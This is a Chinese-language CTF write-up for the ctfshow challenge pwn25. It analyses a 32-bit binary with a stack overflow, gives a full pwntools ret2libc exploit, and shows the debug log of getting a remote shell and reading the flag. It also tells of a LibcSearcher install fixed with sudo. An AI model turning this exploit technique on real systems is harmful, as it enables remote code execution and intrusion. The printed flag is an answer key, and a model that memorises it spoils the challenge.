```
tasike@tasike-VM:~/Desktop$ file pwn25
pwn25: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a7ff1e5d4aed96f8548c422244b28b651ccb8c56, not stripped
tasike@tasike-VM:~/Desktop$ checksec pwn25
[*] '/home/tasike/Desktop/pwn25'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32位，部分开启RELRO，堆栈不可执行。

---------

放IDA里面看看：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 1, 0);
  setvbuf(stdout, 0, 2, 0);
  ctfshow(&argc);
  logo();
  write(0, "Hello CTFshow!\n", 0xEu);
  return 0;
}
```

跟进ctfshow函数：

```
ssize_t ctfshow()
{
  char buf[132]; // [esp+0h] [ebp-88h] BYREF

  return read(0, buf, 0x100u);
}
```

这里虽然有很明显的栈溢出漏洞，但是由于NX enabled(堆栈不可执行)，所以不能简单地ret2syscall，而要ret2libc。

--------------

先用命令查看plt表中的函数，看看有哪些函数可以利用:

```
tasike@tasike-VM:~/Desktop$ objdump -d -j .plt pwn25

pwn25:     file format elf32-i386


Disassembly of section .plt:

08048370 <.plt>:
 8048370:	ff 35 04 a0 04 08    	push   0x804a004
 8048376:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804837c:	00 00                	add    %al,(%eax)
	...

08048380 <read@plt>:
 8048380:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048386:	68 00 00 00 00       	push   $0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <.plt>

08048390 <puts@plt>:
 8048390:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048396:	68 08 00 00 00       	push   $0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <.plt>

080483a0 <__libc_start_main@plt>:
 80483a0:	ff 25 14 a0 04 08    	jmp    *0x804a014
 80483a6:	68 10 00 00 00       	push   $0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <.plt>

080483b0 <write@plt>:
 80483b0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483b6:	68 18 00 00 00       	push   $0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <.plt>

080483c0 <setvbuf@plt>:
 80483c0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483c6:	68 20 00 00 00       	push   $0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <.plt>
```



-----------------

编写exp：

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28240)
elf = ELF('./pwn25')
main = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
payload = cyclic(0x88 + 0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)
r.sendline(payload)
write = u32(r.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)

libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

payload = cyclic(0x88 + 0x4) + p32(system) + p32(main) + p32(bin_sh)
r.sendline(payload)

r.interactive()
```

不知道为啥打不通，先放着吧。。。。。

知道为什么打不通了，原来是LibcSearcher的问题，之前下载的只支持python2，所以一直都不行。

下面是血泪的安装过程（今天是个值得纪念的日子，2023年11月7日，从14点配到17点，终于找到一个有用的博主以及安装方法）(以及我痛恨那些各种复制来复制去的一些博主，明明方法不对还在那写写写，我真的谢谢它们全家，网上全是什么./get的，根本没有用，所以说csdn是个垃圾网站，完全不假)

-------

```
tasike@tasike-VM:~/Desktop$ cd ..
tasike@tasike-VM:~$ git clone https://github.com/dev2ero/LibcSearcher.git
```

事实上，该命令需要多次尝试，因为它一直连不上，尝试了不知道多少次，终于连上：

```
tasike@tasike-VM:~$ git clone https://github.com/dev2ero/LibcSearcher.git
Cloning into 'LibcSearcher'...
fatal: unable to access 'https://github.com/dev2ero/LibcSearcher.git/': GnuTLS recv error (-54): Error in the pull function.

tasike@tasike-VM:~$ git clone https://github.com/dev2ero/LibcSearcher.git
Cloning into 'LibcSearcher'...
fatal: unable to access 'https://github.com/dev2ero/LibcSearcher.git/': Failed to connect to github.com port 443 after 21043 ms: Connection refused

tasike@tasike-VM:~$ git clone https://github.com/dev2ero/LibcSearcher.git
Cloning into 'LibcSearcher'...
remote: Enumerating objects: 96, done.
remote: Counting objects: 100% (96/96), done.
remote: Compressing objects: 100% (78/78), done.
remote: Total 96 (delta 32), reused 53 (delta 14), pack-reused 0
Receiving objects: 100% (96/96), 19.67 KiB | 162.00 KiB/s, done.
Resolving deltas: 100% (32/32), done.
```

当看到done的那一刻，我真的要哭了，太崩溃了，呜呜呜

```
tasike@tasike-VM:~$ cd LibcSearcher
tasike@tasike-VM:~/LibcSearcher$ python3 setup.py develop
running develop
/usr/lib/python3/dist-packages/setuptools/command/easy_install.py:158: EasyInstallDeprecationWarning: easy_install command is deprecated. Use build and pip and other standards-based tools.
  warnings.warn(
/usr/lib/python3/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
  warnings.warn(
error: can't create or remove files in install directory

The following error occurred while trying to add or remove files in the
installation directory:

    [Errno 13] Permission denied: '/usr/local/lib/python3.10/dist-packages/test-easy-install-8329.write-test'

The installation directory you specified (via --install-dir, --prefix, or
the distutils default setting) was:

    /usr/local/lib/python3.10/dist-packages/

Perhaps your account does not have write access to this directory?  If the
installation directory is a system-owned directory, you may need to sign in
as the administrator or "root" account.  If you do not have administrative
access to this machine, you may wish to choose a different installation
directory, preferably one that is listed in your PYTHONPATH environment
variable.

For information on other options, you may wish to consult the
documentation at:

  https://setuptools.pypa.io/en/latest/deprecated/easy_install.html

Please make the appropriate changes for your system and try again.

```

这个又遇到问题了，报这么长，我也查了很多，用了很多方法，最后发现只需要用用超级用户就行，哎，都是泪的教训：
```
tasike@tasike-VM:~/LibcSearcher$ sudo su 

root@tasike-VM:/home/tasike/LibcSearcher# python3 setup.py develop
running develop
/usr/lib/python3/dist-packages/setuptools/command/easy_install.py:158: EasyInstallDeprecationWarning: easy_install command is deprecated. Use build and pip and other standards-based tools.
  warnings.warn(
/usr/lib/python3/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
  warnings.warn(
/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 0.1.43ubuntu1 is an invalid version and will not be supported in a future release
  warnings.warn(
/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.1build1 is an invalid version and will not be supported in a future release
  warnings.warn(
running egg_info
creating LibcSearcher.egg-info
writing LibcSearcher.egg-info/PKG-INFO
writing dependency_links to LibcSearcher.egg-info/dependency_links.txt
writing requirements to LibcSearcher.egg-info/requires.txt
writing top-level names to LibcSearcher.egg-info/top_level.txt
writing manifest file 'LibcSearcher.egg-info/SOURCES.txt'
reading manifest file 'LibcSearcher.egg-info/SOURCES.txt'
writing manifest file 'LibcSearcher.egg-info/SOURCES.txt'
running build_ext
Creating /usr/local/lib/python3.10/dist-packages/LibcSearcher.egg-link (link to .)
Removing LibcSearcher 0.1 from easy-install.pth file
Adding LibcSearcher 1.1.5 to easy-install.pth file

Installed /home/tasike/LibcSearcher
Processing dependencies for LibcSearcher==1.1.5
Searching for requests==2.25.1
Best match: requests 2.25.1
Adding requests 2.25.1 to easy-install.pth file

Using /usr/lib/python3/dist-packages
Finished processing dependencies for LibcSearcher==1.1.5

```

这时候退出超级用户，回到存放exp.py的目录，再次运行该exp.py

```
root@tasike-VM:/home/tasike/LibcSearcher# exit
exit
tasike@tasike-VM:~/LibcSearcher$ cd ..
tasike@tasike-VM:~$ cd Desktop/
tasike@tasike-VM:~/Desktop$ python3 exp.py
```

结果出来并且成功getshell的时候我真的要哭死了，简直了，终于可以成功，终于可以做ret2libc类的题目了，我的喜悦无法表达：
```
[+] Opening connection to pwn.challenge.ctf.show on port 28260: Done
[*] '/home/tasike/Desktop/pwn25'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] Sent 0xa1 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  b0 83 04 08  │haab│iaab│jaab│····│
    00000090  2d 86 04 08  00 00 00 00  18 a0 04 08  04 00 00 00  │-···│····│····│····│
    000000a0  0a                                                  │·│
    000000a1
[DEBUG] Received 0x4 bytes:
    00000000  f0 f6 e3 f7                                         │····│
    00000004
0xf7e3f6f0
[+] There are multiple libc that meet current constraints :
0 - libc6_2.19-0ubuntu6_amd64
1 - libc6_2.19-0ubuntu4_amd64
2 - libc6_2.19-0ubuntu3_amd64
3 - libc6_2.19-0ubuntu5_amd64
4 - libc-2.36-22.mga9.x86_64
5 - libc6-i386_2.27-3ubuntu1_amd64
6 - libc6_2.17-93ubuntu2_amd64
7 - libc6-i386_2.27-3ubuntu1.3_amd64
8 - libc6-i386_2.27-3ubuntu1.4_amd64
9 - libc6_2.17-93ubuntu4_amd64
[+] Choose one : 5
[DEBUG] Sent 0x99 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  10 6d d9 f7  │haab│iaab│jaab│·m··│
    00000090  2d 86 04 08  cf 58 ed f7  0a                        │-···│·X··│·│
    00000099
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x64 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2e bytes:
    b'ctfshow{18f70e86-d581-4e45-bcf7-3c7b21e350bf}\n'
ctfshow{18f70e86-d581-4e45-bcf7-3c7b21e350bf}

```





















